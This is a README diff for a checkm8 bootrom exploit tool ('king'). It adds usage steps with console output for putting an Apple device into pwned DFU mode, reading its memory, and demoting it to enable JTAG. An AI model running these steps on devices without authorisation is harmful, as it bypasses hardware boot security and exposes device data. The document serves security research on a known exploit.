@@ -20,7 +20,7 @@ cp -R ../bin .
 
 # Run check-m8 exploit
 ```
-sudo ./king
+sudo ./king checkm8
 [*] Shellcode generated ...
 [*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
 [*] stage 1, heap grooming ...
@@ -30,6 +30,28 @@ sudo ./king
 [*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33]
 [*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
 [!] Device is now in pwned DFU Mode! :D
+```
+
+# Read memory
+```
+sudo ./king read64 0x100000280
+[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
+[*] [100000280] = 36322D746F6F4269
+```
+
+```
+sudo ./king read32 0x100000280
+[*] Device Serial Number: CPID:8010 CPRV:11 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
+[*] [100000280] = 6F6F4269
+```
+
+# Demote device (Enable JTAG)
+```
+[*] Device Serial Number: CPID:8010 ... SRTG:[iBoot-2696.0.0.1.33] PWND:[checkm8]
+[*] DemotionReg: 287
+[*] Setting Value...
+[*] New DemotionReg: 286
+[!] Succeeded to enable the JTAG!
 ```
 
 # Limitations
